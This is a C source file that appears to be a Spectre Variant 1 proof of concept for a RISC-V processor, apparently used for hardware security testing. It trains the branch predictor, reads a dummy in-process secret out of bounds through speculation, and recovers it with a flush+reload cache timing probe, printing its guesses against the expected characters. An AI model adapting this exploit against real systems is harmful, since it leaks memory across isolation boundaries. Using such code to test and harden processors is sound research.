#include <klib.h> // [1]
#include "encoding.h"
#include "cache-utils.h"

#ifndef TRAIN_TIMES
#define TRAIN_TIMES 6 // BOOM Spectre-v1 PoC uses six training iterations.
#endif
#ifndef ROUNDS
#define ROUNDS 1 // run the train + attack sequence X amount of times (for redundancy)
#endif
#ifndef ATTACK_SAME_ROUNDS
#define ATTACK_SAME_ROUNDS 10 // amount of times to attack the same index
#endif
#ifndef SECRET_SZ
#define SECRET_SZ 6
#endif
#ifndef CACHE_HIT_THRESHOLD
#define CACHE_HIT_THRESHOLD 70
#endif
#ifndef USE_FIXED_CACHE_HIT_THRESHOLD
#define USE_FIXED_CACHE_HIT_THRESHOLD 0
#endif
#ifndef FLUSH_LINES
#define FLUSH_LINES 256
#endif
#ifndef FLUSH_CANDIDATE_LINES_ONLY
#define FLUSH_CANDIDATE_LINES_ONLY 0
#endif
#ifndef FLUSH_SINGLE_CANDIDATE_IDX
#define FLUSH_SINGLE_CANDIDATE_IDX -1
#endif
#ifndef PROBE_CANDIDATES
#define PROBE_CANDIDATES 62
#endif
#ifndef PROBE_MIX_STRIDE
#define PROBE_MIX_STRIDE 17
#endif
#ifndef PROBE_MIX_BIAS
#define PROBE_MIX_BIAS 13
#endif
#ifndef PRINT_TOP_N
#define PRINT_TOP_N 8
#endif

uint64_t array1_sz = 16;
uint8_t unused1[64];
uint8_t array1[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t __attribute__((aligned(4096))) array2[256 * L1_BLOCK_SZ_BYTES];

char secretString[] = "S3CreT";

static inline uint64_t candidateValue(uint64_t idx){
    if (idx < 10) return '0' + idx;
    if (idx < 36) return 'A' + (idx - 10);
    return 'a' + (idx - 36);
}

static inline uint64_t mixedCandidateIdx(uint64_t idx){
    return (idx * PROBE_MIX_STRIDE + PROBE_MIX_BIAS) % PROBE_CANDIDATES;
}

static inline void flushProbeArray(void){
#if FLUSH_SINGLE_CANDIDATE_IDX >= 0
    uint64_t mixed_i = candidateValue(FLUSH_SINGLE_CANDIDATE_IDX);
    xs_flush_cache_line(&array2[mixed_i * L1_BLOCK_SZ_BYTES]);
#elif FLUSH_CANDIDATE_LINES_ONLY
    for (uint64_t i = 0; i < PROBE_CANDIDATES; ++i){
        uint64_t mixed_i = candidateValue(mixedCandidateIdx(i));
        xs_flush_cache_line(&array2[mixed_i * L1_BLOCK_SZ_BYTES]);
    }
#else
    for (uint64_t i = 0; i < FLUSH_LINES; ++i){
        xs_flush_cache_line(&array2[i * L1_BLOCK_SZ_BYTES]);
    }
#endif
    xs_fence();
}

/**
 * reads in inArray array (and corresponding size) and outIdxArrays top two idx's (and their
 * corresponding values) in the inArray array that has the highest values.
 *
 * @input inArray array of values to find the top two maxs
 * @input inArraySize size of the inArray array in entries
 * @inout outIdxArray array holding the idxs of the top two values
 *        ([0] idx has the larger value in inArray array)
 * @inout outValArray array holding the top two values ([0] has the larger value)
 */
void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray){
    outValArray[0] = 0;
    outValArray[1] = 0;

    for (uint64_t i = 0; i < inArraySize; ++i){
        if (inArray[i] > outValArray[0]){
            outValArray[1] = outValArray[0];
            outValArray[0] = inArray[i];
            outIdxArray[1] = outIdxArray[0];
            outIdxArray[0] = i;
        }
        else if (inArray[i] > outValArray[1]){
            outValArray[1] = inArray[i];
            outIdxArray[1] = i;
        }
    }
}

static void printTopCandidates(uint64_t* results, uint64_t expected){
    uint64_t topVal[PRINT_TOP_N];
    uint8_t topIdx[PRINT_TOP_N];
    uint64_t nonzero = 0;

    for (uint64_t i = 0; i < PRINT_TOP_N; ++i){
        topVal[i] = 0;
        topIdx[i] = 0;
    }

    for (uint64_t rankIdx = 0; rankIdx < PROBE_CANDIDATES; ++rankIdx){
        uint8_t candidate = candidateValue(rankIdx);
        uint64_t val = results[candidate];
        nonzero += val != 0;

        for (uint64_t pos = 0; pos < PRINT_TOP_N; ++pos){
            if (val > topVal[pos]){
                for (int64_t shift = PRINT_TOP_N - 1; shift > (int64_t)pos; --shift){
                    topVal[shift] = topVal[shift - 1];
                    topIdx[shift] = topIdx[shift - 1];
                }
                topVal[pos] = val;
                topIdx[pos] = candidate;
                break;
            }
        }
    }

    printf("debug nonzero=%lu expected_hits=%lu top%d:", nonzero, results[expected], PRINT_TOP_N);
    for (uint64_t i = 0; i < PRINT_TOP_N; ++i){
        printf(" (%lu,%c,%d)", topVal[i], topIdx[i], topIdx[i]);
    }
    printf("\n");
}

/**
 * takes in an idx to use to access a secret array. this idx is used to read any mem addr outside
 * the bounds of the array through the Spectre Variant 1 attack.
 *
 * @input idx input to be used to idx the array
 */
uint8_t victimFunc(uint64_t idx){
    uint8_t volatile dummy = 2;

    // stall array1_sz by doing div operations (operation is (array1_sz << 4) / (2*4))
    array1_sz =  array1_sz << 4;
    asm("fcvt.s.lu	fa4, %[in]\n"
        "fcvt.s.lu	fa5, %[inout]\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fcvt.lu.s	%[out], fa5, rtz\n"
        : [out] "=r" (array1_sz)
        : [inout] "r" (array1_sz), [in] "r" (dummy)
        : "fa4", "fa5");

    if (idx < array1_sz){
        dummy = array2[array1[idx] * L1_BLOCK_SZ_BYTES];
    }

    // bound speculation here just in case it goes over
    dummy = rdcycle();  
	return dummy; //Not used
}

int main(void){
    uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
	uint64_t start, end, diff, passInIdx, randIdx;
    uint8_t volatile dummy = 0;
    static uint64_t results[256];
#if USE_FIXED_CACHE_HIT_THRESHOLD
    uint64_t measured_threshold = 0;
    uint64_t threshold = CACHE_HIT_THRESHOLD;
#else
    uint64_t measured_threshold = xs_calibrate_threshold(array2, L1_BLOCK_SZ_BYTES);
    uint64_t threshold = measured_threshold;
    if (threshold == 0) {
        threshold = CACHE_HIT_THRESHOLD;
    }
#endif

    printf("[v1] calibration fallback=%d measured=%lu threshold=%lu fixed=%d\n",
           CACHE_HIT_THRESHOLD, measured_threshold, threshold, USE_FIXED_CACHE_HIT_THRESHOLD);
    printf("[v1] reading %d bytes\n", SECRET_SZ);

    // try to read out the secret
    for(uint64_t len = 0; len < SECRET_SZ; ++len){

        // clear results every round
        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
            results[cIdx] = 0;
        }

        // run the attack on the same idx ATTACK_SAME_ROUNDS times
        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){
			//printf("attack round %d\n", atkRound);

#if USE_EVICTION_FLUSH
            // make sure array you read from is not in the cache by using DIY flushCache or CacheManagementOperations through flushCacheLine
            flushCache((uint64_t)array2, sizeof(array2));
#else
            flushProbeArray();
#endif
            xs_fence();

            for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j){
                // bit twiddling to set passInIdx=randIdx or to attackIdx after TRAIN_TIMES iterations
                // avoid jumps in case those tip off the branch predictor
                // note: randIdx changes everytime the atkRound changes so that the tally does not get affected
                //       training creates a false hit in array2 for that array1 value (you want this to be ignored by having it changed)
                randIdx = (atkRound * 7 + len * 3 + 1) % array1_sz;
                passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
                passInIdx = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
                passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx 

                // set of constant takens to make the BHR be in a all taken state
                for(uint64_t k = 0; k < 30; ++k){
                    asm("");
                }

                // call function to train or attack
                victimFunc(passInIdx);
            }
            
            // read out array 2 and see the hit secret value
            // this is also assuming there is no prefetching
            for (uint64_t i = 0; i < PROBE_CANDIDATES; ++i){
                uint64_t mixed_i = candidateValue(mixedCandidateIdx(i));
				xs_fence(); // fence to correctly read CSR register as can be executed OoO
                start = rdcycle();
				
                dummy &= array2[mixed_i * L1_BLOCK_SZ_BYTES];
				
				xs_fence();
				end = rdcycle();
				
                diff = end - start;
				//printf("diff %d\n", diff);
                if ( diff < threshold ){
                    results[mixed_i] += 1;
                }
            }
			//printf("diff %d, %lu\n", diff, start);
        }
        
        // get highest and second highest result hit values
        uint8_t output[2];
        uint64_t hitArray[2];
        topTwoIdx(results, 256, output, hitArray);

        printf("m[0x%p] = want(%c) =?= guess(hits,char) 1.(%lu, %c) 2.(%lu, %c)\n", (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], hitArray[1], output[1]); 
        printf("debug expected_dec=%d guess1_dec=%d hits1=%lu guess2_dec=%d hits2=%lu expected_hits=%lu\n",
               (int)(uint8_t)secretString[len], (int)output[0], hitArray[0],
               (int)output[1], hitArray[1], results[(uint8_t)secretString[len]]);
        printTopCandidates(results, (uint8_t)secretString[len]);
        //printf("want(%c) =?= guess 1.(%c) 2.(%c)\n", secretString[len], output[0], output[1]); 

        // read in the next secret 
        ++attackIdx;
    }

    return 0;
}
